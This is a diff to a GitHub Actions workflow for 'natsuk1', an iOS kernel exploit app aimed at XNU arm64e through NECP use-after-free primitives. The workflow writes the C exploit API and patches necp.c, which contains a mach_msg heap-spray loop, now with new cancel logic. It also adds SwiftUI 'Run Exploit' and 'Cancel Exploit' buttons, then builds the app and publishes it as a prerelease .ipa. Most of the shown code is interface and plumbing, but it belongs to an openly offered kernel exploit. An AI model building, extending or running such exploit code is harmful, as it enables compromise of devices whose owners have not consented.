@@ -30,6 +30,79 @@ jobs:
           rm -f .github/workflows/natsuk1.yml
           rm -f .github/workflows/main.yml
 
+      - name: Write nk_api.h
+        run: |
+          cat > natsuk1/Exploit/nk_api.h <<'H'
+          #ifndef NK_API_H
+          #define NK_API_H
+          #include <stdint.h>
+          #include <stddef.h>
+
+          void nk_set_log(void (*fn)(const char *));
+          void nk_logx(const char *tag, const char *fmt, ...);
+          void nk_log(const char *fmt, ...);
+          void nk_rule(void);
+
+          int nk_run(void);
+          int nk_full_exploit(void);
+          int nk_necp_run(void);
+          void nk_necp_cancel(void);
+
+          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
+          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
+          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
+          #endif
+          H
+
+      - name: Write nk_api.c
+        run: |
+          cat > natsuk1/Exploit/nk_api.c <<'C'
+          #include "nk_api.h"
+          #include "nk_offsets.h"
+          #include <stdarg.h>
+          #include <stdio.h>
+
+          static void (*g_fn)(const char *) = NULL;
+
+          void nk_set_log(void (*fn)(const char *)) { g_fn = fn; }
+
+          void nk_logx(const char *tag, const char *fmt, ...) {
+              if (!g_fn) return;
+              char body[448];
+              va_list ap; va_start(ap, fmt);
+              vsnprintf(body, sizeof(body), fmt, ap);
+              va_end(ap);
+              char out[512];
+              snprintf(out, sizeof(out), "[%s] %s", tag, body);
+              g_fn(out);
+          }
+
+          void nk_log(const char *fmt, ...) {
+              if (!g_fn) return;
+              char body[448];
+              va_list ap; va_start(ap, fmt);
+              vsnprintf(body, sizeof(body), fmt, ap);
+              va_end(ap);
+              char out[512];
+              snprintf(out, sizeof(out), "[MAIN] %s", body);
+              g_fn(out);
+          }
+
+          void nk_rule(void) { nk_log("----"); }
+
+          int nk_run(void) {
+              NK_INFO("BASE", "kernel %llX", (unsigned long long)NK_KERNEL_BASE);
+              NK_INFO("BASE", "sysent %llX (%d)", (unsigned long long)NK_SYSENT_BASE, NK_SYSENT_COUNT);
+              nk_rule();
+              NK_WARN("STAT", "No kernel R/W primitive.");
+              nk_rule();
+              return 0;
+          }
+
+          /* natsuk1-v8-api */
+          int nk_full_exploit(void) { return nk_necp_run(); }
+          C
+
       - name: Write necp.c
         run: |
           cat > natsuk1/Exploit/necp.c <<'NECP'
@@ -73,6 +146,9 @@ jobs:
 
           static const int MSG_SIZES[] = { 768, 960, 1216 };
           #define MSG_SIZES_COUNT 3
+
+          static volatile int g_busy = 0;
+          static volatile int g_cancel = 0;
 
           static void lg(const char *tag, const char *sign, const char *fmt, ...) {
               char body[448];
@@ -152,6 +228,7 @@ jobs:
               uint8_t *mbuf = malloc((size_t)msgsz);
               if (!mbuf) return 0;
               for (int i = 0; i < sp->n; i++) {
+                  if (g_cancel) break;
                   for (int j = 0; j < SPRAY_PER_PORT; j++) {
                       memset(mbuf, 0x42, (size_t)msgsz);
                       mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
@@ -219,11 +296,9 @@ jobs:
               return c;
           }
 
-          static volatile int g_busy = 0;
-
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v2.7 (natsuk1-kread-v17) ===");
+              nk_log("=== natsuk1 v2.8 (natsuk1-kread-v18) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
               LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d SIZES=%d",
@@ -240,6 +315,7 @@ jobs:
               LI("P3", "target=0x%llx", (unsigned long long)target);
 
               for (int i = 0; i < MSG_SIZES_COUNT; i++) {
+                  if (g_cancel) { LW("CANCEL", "cancelled at size %d", i); return 2; }
                   int msgsz = MSG_SIZES[i];
                   uint8_t buf[RESBUF];
                   int r = 0;
@@ -282,28 +358,147 @@ jobs:
                   nk_log("[!] already running");
                   return 1;
               }
+              g_cancel = 0;
               int rc = impl();
               __sync_lock_release(&g_busy);
               return rc;
           }
+
+          void nk_necp_cancel(void) {
+              g_cancel = 1;
+              nk_log("[!] cancel requested");
+          }
           NECP
+
+      - name: Write OverviewView.swift
+        run: |
+          cat > natsuk1/Views/OverviewView.swift <<'SWIFT'
+          import SwiftUI
+          import UIKit
+
+          struct OverviewView: View {
+              @EnvironmentObject var state: AppState
+              @State private var copied = false
+
+              var body: some View {
+                  NavigationStack {
+                      List {
+                          Section {
+                              Button {
+                                  state.necp_run()
+                              } label: {
+                                  HStack {
+                                      Image(systemName: "bolt.fill")
+                                      Text("Run Exploit")
+                                      Spacer()
+                                      if state.running { ProgressView().scaleEffect(0.8) }
+                                  }
+                              }
+                              .disabled(state.running)
+
+                              Button(role: .destructive) {
+                                  state.cancel()
+                              } label: {
+                                  HStack {
+                                      Image(systemName: "xmark.circle")
+                                      Text("Cancel Exploit")
+                                  }
+                              }
+                              .disabled(!state.running)
+                          } header: {
+                              Label("Exploit", systemImage: "cpu")
+                          }
+
+                          RuntimeView()
+                              .environmentObject(state)
+
+                          Section {
+                              LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
+                          } header: {
+                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
+                          }
+
+                          Section {
+                              Button {
+                                  UIPasteboard.general.string = state.log
+                                  copied = true
+                                  DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
+                                      copied = false
+                                  }
+                              } label: {
+                                  HStack {
+                                      Image(systemName: copied ? "checkmark" : "doc.on.doc")
+                                      Text(copied ? "Copied!" : state.t("Copy All", "Копировать всё"))
+                                  }
+                              }
+                              .disabled(state.log.isEmpty)
+
+                              Button(role: .destructive) { state.clear() } label: {
+                                  HStack {
+                                      Image(systemName: "trash")
+                                      Text(state.t("Clear", "Очистить"))
+                                  }
+                              }
+                              .disabled(state.log.isEmpty)
+                          }
+                      }
+                      .listStyle(.insetGrouped)
+                      .navigationTitle("natsuk1")
+                      .navigationBarTitleDisplayMode(.inline)
+                  }
+              }
+          }
+
+          struct StatusDot: View {
+              let status: AppState.Status
+              @State private var pulse = false
+              var body: some View {
+                  Image(systemName: "circle.fill")
+                      .font(.system(size: 14))
+                      .foregroundStyle(status.color)
+                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
+                      .scaleEffect(pulse ? 1.2 : 1.0)
+                      .animation(
+                          status == .running
+                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
+                              : .default,
+                          value: pulse
+                      )
+                      .onAppear { if status == .running { pulse = true } }
+                      .onChange(of: status) { _, s in pulse = (s == .running) }
+              }
+          }
+
+          struct LogTerminal: View {
+              let text: String
+              var body: some View {
+                  ScrollView {
+                      Text(text)
+                          .font(.system(size: 10, design: .monospaced))
+                          .multilineTextAlignment(.leading)
+                          .foregroundStyle(.primary)
+                          .frame(maxWidth: .infinity, alignment: .leading)
+                  }
+                  .frame(minHeight: 200, maxHeight: 400)
+              }
+          }
+          SWIFT
 
       - name: Write AirliftView.swift
         run: |
           cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
           import SwiftUI
           import UIKit
+          import Combine
 
           struct AirliftView: View {
               @EnvironmentObject var airlift: AirliftBridge
               @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
               @State private var tunnelIP: String? = NetworkStatus.tunnelIP()
               @State private var deviceIP: String? = NetworkStatus.deviceIP()
-              @State private var refreshTick: UInt64 = 0
+              @State private var copied = false
 
-              private var timer: Publishers.Autoconnect<Timer.TimerPublisher> {
-                  Timer.publish(every: 3.0, on: .main, in: .common).autoconnect()
-              }
+              private let ticker = Timer.publish(every: 3.0, on: .main, in: .common).autoconnect()
 
               var body: some View {
                   List {
@@ -319,7 +514,7 @@ jobs:
                   .navigationTitle("Airlift")
                   .navigationBarTitleDisplayMode(.inline)
                   .onAppear { refresh() }
-                  .onReceive(timer) { _ in refresh() }
+                  .onReceive(ticker) { _ in refresh() }
                   .refreshable { refresh() }
               }
 
@@ -332,7 +527,6 @@ jobs:
                           if self.loopbackVPNUp != vpn { self.loopbackVPNUp = vpn }
                           if self.tunnelIP != tun { self.tunnelIP = tun }
                           if self.deviceIP != dev { self.deviceIP = dev }
-                          refreshTick &+= 1
                       }
                   }
               }
@@ -425,11 +619,19 @@ jobs:
                   Section {
                       if case .pairing = airlift.state {
                           Button(role: .destructive) { airlift.cancelPairing() } label: {
-                              Text("Cancel Pairing").frame(maxWidth: .infinity)
+                              HStack {
+                                  Image(systemName: "xmark.circle")
+                                  Text("Cancel Pairing")
+                              }
+                              .frame(maxWidth: .infinity)
                           }
                       } else {
                           Button { airlift.runPairing() } label: {
-                              Text("Start Pairing").frame(maxWidth: .infinity)
+                              HStack {
+                                  Image(systemName: "antenna.radiowaves.left.and.right")
+                                  Text("Start Pairing")
+                              }
+                              .frame(maxWidth: .infinity)
                           }
                       }
                   }
@@ -495,7 +697,17 @@ jobs:
                       }
                       .disabled(airlift.state == .running || !loopbackVPNUp)
 
-                      Button { stateRespring() } label: {
+                      Button(role: .destructive) {
+                          airlift.cancelExploit()
+                      } label: {
+                          HStack {
+                              Image(systemName: "xmark.circle")
+                              Text("Cancel Exploit")
+                          }
+                      }
+                      .disabled(airlift.state != .running)
+
+                      Button { respring() } label: {
                           HStack {
                               Image(systemName: "arrow.clockwise")
                               Text("Respring")
@@ -507,13 +719,20 @@ jobs:
 
                   Section {
                       Button(role: .destructive) { airlift.deletePairing() } label: {
-                          Text("Delete Pairing").frame(maxWidth: .infinity)
+                          HStack {
+                              Image(systemName: "trash")
+                              Text("Delete Pairing")
+                          }
+                          .frame(maxWidth: .infinity)
                       }
                   }
               }
 
-              private func stateRespring() {
-                  NotificationCenter.default.post(name: Notification.Name("natsuk1.respring"), object: nil)
+              private func respring() {
+                  NotificationCenter.default.post(
+                      name: Notification.Name("natsuk1.respring"),
+                      object: nil
+                  )
               }
 
               @ViewBuilder
@@ -525,30 +744,103 @@ jobs:
                   } header: {
                       Label("Log", systemImage: "terminal")
                   }
+
+                  Section {
+                      Button {
+                          UIPasteboard.general.string = airlift.exploitLog.joined(separator: "\n")
+                          copied = true
+                          DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
+                              copied = false
+                          }
+                      } label: {
+                          HStack {
+                              Image(systemName: copied ? "checkmark" : "doc.on.doc")
+                              Text(copied ? "Copied!" : "Copy All")
+                          }
+                      }
+                      .disabled(airlift.exploitLog.isEmpty)
+
+                      Button(role: .destructive) { airlift.clearLog() } label: {
+                          HStack {
+                              Image(systemName: "trash")
+                              Text("Clear")
+                          }
+                      }
+                      .disabled(airlift.exploitLog.isEmpty)
+                  }
               }
           }
           SWIFT
 
-      - name: Patch natsuk1.swift for respring notification
+      - name: Patch natsuk1.swift (cancel + respring)
         run: |
           python3 - <<'PYEOF'
           import sys
           P = "natsuk1/natsuk1.swift"
           with open(P) as f: s = f.read()
-          if "natsuk1-respring-v1" in s:
-              print("already patched"); sys.exit(0)
-          old = '.onChange(of: scenePhase) { _, phase in'
-          if old not in s:
-              print("FAIL: scenePhase marker missing"); sys.exit(1)
-          add = ('.onReceive(NotificationCenter.default.publisher(for: Notification.Name("natsuk1.respring"))) { _ in\n'
-                 '                        state.show_respring = true /* natsuk1-respring-v1 */\n'
-                 '                    }\n'
-                 '                    .onChange(of: scenePhase) { _, phase in')
-          s = s.replace(old, add, 1)
+
+          changed = False
+
+          # 1. respring hook
           if "natsuk1-respring-v1" not in s:
-              print("FAIL: marker missing after patch"); sys.exit(1)
+              old = '.onChange(of: scenePhase) { _, phase in'
+              if old not in s:
+                  print("FAIL: scenePhase marker missing"); sys.exit(1)
+              add = ('.onReceive(NotificationCenter.default.publisher(for: Notification.Name("natsuk1.respring"))) { _ in\n'
+                     '                        state.show_respring = true /* natsuk1-respring-v1 */\n'
+                     '                    }\n'
+                     '                    .onChange(of: scenePhase) { _, phase in')
+              s = s.replace(old, add, 1)
+              if "natsuk1-respring-v1" not in s:
+                  print("FAIL: respring marker missing"); sys.exit(1)
+              changed = True
+
+          # 2. cancel method in AppState
+          if "natsuk1-cancel-v1" not in s:
+              old = '    func clear() { LockedBuffer.shared.clear(); log = "" }'
+              if old not in s:
+                  print("FAIL: clear() marker missing"); sys.exit(1)
+              add = (old + '\n'
+                     '    func cancel() { /* natsuk1-cancel-v1 */\n'
+                     '        nk_necp_cancel()\n'
+                     '        append("[*] cancel requested")\n'
+                     '    }')
+              s = s.replace(old, add, 1)
+              if "natsuk1-cancel-v1" not in s:
+                  print("FAIL: cancel marker missing"); sys.exit(1)
+              changed = True
+
+          if changed:
+              with open(P, "w") as f: f.write(s)
+              print("natsuk1.swift patched")
+          else:
+              print("natsuk1.swift already patched")
+          PYEOF
+
+      - name: Patch AirliftBridge.swift (cancelExploit)
+        run: |
+          python3 - <<'PYEOF'
+          import sys
+          P = "natsuk1/Helpers/AirliftBridge.swift"
+          with open(P) as f: s = f.read()
+
+          if "natsuk1-cancel-v1" in s:
+              print("already patched"); sys.exit(0)
+
+          old = '    func respring() {'
+          if old not in s:
+              print("FAIL: respring() marker missing"); sys.exit(1)
+          add = ('    func cancelExploit() { /* natsuk1-cancel-v1 */\n'
+                 '        nk_necp_cancel()\n'
+                 '        appendLog("[exploit] cancel requested")\n'
+                 '        state = .done(ok: false, message: "cancelled")\n'
+                 '    }\n\n'
+                 '    func respring() {')
+          s = s.replace(old, add, 1)
+          if "natsuk1-cancel-v1" not in s:
+              print("FAIL: cancel marker missing"); sys.exit(1)
           with open(P, "w") as f: f.write(s)
-          print("natsuk1.swift respring hook added")
+          print("AirliftBridge.swift patched")
           PYEOF
 
       - name: Write README.md
@@ -569,7 +861,7 @@ jobs:
 
           ## Overview
 
-          Kernel-level research project targeting XNU on arm64e. Includes:
+          Kernel-level research project targeting XNU on arm64e.
 
           - NECP UAF primitives with double-free confirmation
           - Kernel offset database for iOS 27.0 / 24A437
@@ -654,41 +946,71 @@ jobs:
       - name: Verify
         run: |
           F=natsuk1/Exploit/necp.c
+          H=natsuk1/Exploit/nk_api.h
+          C=natsuk1/Exploit/nk_api.c
+          O=natsuk1/Views/OverviewView.swift
           A=natsuk1/Views/AirliftView.swift
           N=natsuk1/natsuk1.swift
+          B=natsuk1/Helpers/AirliftBridge.swift
           FAIL=0
           chk() {
             if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
+
           echo "--- necp.c ---"
           chk "NCF_ASN 0x20"      "grep -q -e 'NCF_ASN 0x20' $F"
-          chk "marker v17"        "grep -q -e 'natsuk1-kread-v17' $F"
-          chk "sizes 3"           "test \$(grep -c -e '768, 960, 1216' $F) = 1"
-          chk "nk_necp_run"       "grep -q -e 'int nk_necp_run(void)' $F"
+          chk "marker v18"        "grep -q -e 'natsuk1-kread-v18' $F"
+          chk "nk_necp_cancel"    "grep -q -e 'void nk_necp_cancel(void)' $F"
+          chk "g_cancel var"      "grep -q -e 'g_cancel' $F"
+          chk "cancel in impl"    "grep -q -e 'if (g_cancel)' $F"
+
+          echo "--- nk_api.h ---"
+          chk "cancel decl"       "grep -q -e 'void nk_necp_cancel(void)' $H"
+
+          echo "--- nk_api.c ---"
+          chk "v8-api marker"     "grep -q -e 'natsuk1-v8-api' $C"
+          chk "full_exploit"      "grep -q -e 'int nk_full_exploit(void)' $C"
+
+          echo "--- OverviewView ---"
+          chk "cancel button"     "grep -q -e 'Cancel Exploit' $O"
+          chk "cancel call"       "grep -q -e 'state.cancel()' $O"
+          chk "Copied! feedback"  "grep -q -e 'Copied!' $O"
 
           echo "--- AirliftView ---"
-          chk "no id(tick)"       "! grep -q -e '.id(tick)' $A"
-          chk "timer 3s"          "grep -q -e 'every: 3.0' $A"
+          chk "import Combine"    "grep -q -e '^import Combine' $A"
+          chk "ticker"            "grep -q -e 'Timer.publish' $A"
           chk "async refresh"     "grep -q -e 'DispatchQueue.global' $A"
-          chk "respring notify"   "grep -q -e 'natsuk1.respring' $A"
-          chk "loopback check"    "grep -q -e 'loopbackVPNUp' $A"
+          chk "cancelExploit"     "grep -q -e 'airlift.cancelExploit()' $A"
+          chk "Cancel Exploit"    "grep -q -e 'Cancel Exploit' $A"
+          chk "Copied!"           "grep -q -e 'Copied!' $A"
+          chk "Copy All"          "grep -q -e 'Copy All' $A"
 
           echo "--- natsuk1.swift ---"
           chk "respring hook"     "grep -q -e 'natsuk1-respring-v1' $N"
+          chk "cancel v1"         "grep -q -e 'natsuk1-cancel-v1' $N"
+          chk "nk_necp_cancel"    "grep -q -e 'nk_necp_cancel()' $N"
 
-          echo "--- README ---"
-          chk "README exists"     "test -f README.md"
-          chk "README badges"     "grep -q -e 'shields.io' README.md"
+          echo "--- AirliftBridge.swift ---"
+          chk "cancel v1 marker"  "grep -q -e 'natsuk1-cancel-v1' $B"
+          chk "cancelExploit fn"  "grep -q -e 'func cancelExploit' $B"
 
-          echo "--- syntax ---"
+          echo "--- C syntax ---"
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
           if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
               -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
-              echo "  OK   clang syntax"
+              echo "  OK   clang necp.c"
           else
-              echo "  FAIL clang syntax"
+              echo "  FAIL clang necp.c"
               FAIL=1
           fi
+          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
+              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$C" 2>&1; then
+              echo "  OK   clang nk_api.c"
+          else
+              echo "  FAIL clang nk_api.c"
+              FAIL=1
+          fi
+
           if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
           echo "VERIFY OK"
 
@@ -740,7 +1062,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "fast kread, Airlift async refresh, safe respring, README"
+            --notes "cancel exploit + copy feedback + workflow optimization"
 
       - name: Commit
         run: |
@@ -748,11 +1070,15 @@ jobs:
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add \
+            natsuk1/Exploit/nk_api.h \
+            natsuk1/Exploit/nk_api.c \
             natsuk1/Exploit/necp.c \
+            natsuk1/Views/OverviewView.swift \
             natsuk1/Views/AirliftView.swift \
             natsuk1/natsuk1.swift \
+            natsuk1/Helpers/AirliftBridge.swift \
             README.md \
             .gitignore
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "fast kread + Airlift async + respring fix + README [skip ci]"
+          git commit -m "cancel exploit + copy feedback + workflow optimization [skip ci]"
           git push
